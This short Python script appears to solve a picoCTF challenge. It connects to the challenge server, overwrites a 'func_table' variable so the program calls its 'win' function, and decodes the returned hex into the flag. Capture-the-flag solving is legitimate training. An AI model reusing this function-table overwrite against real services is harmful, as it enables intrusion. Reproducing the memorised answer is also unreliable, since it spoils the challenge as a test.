import socket
import time

address = 'saturn.picoctf.net'
port = 53437


args = ['3', 
        'func_table', 
        "'print_table                     read_variable                   write_variable                  win                             '",
        '4']


def createFlag(values):
    chars = values[:len(values) - 6].split(' ')
    print(f'THE FLAG IS {''.join([chr(int(char, 16)) for char in chars])}!!!!')



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((address, port))

initialPrompt = s.recv(1024)

for arg in args:
    s.send((arg + '\n').encode())
    time.sleep(1)
    response = s.recv(2048).decode()
    if arg == '4':
        createFlag(response)


s.close()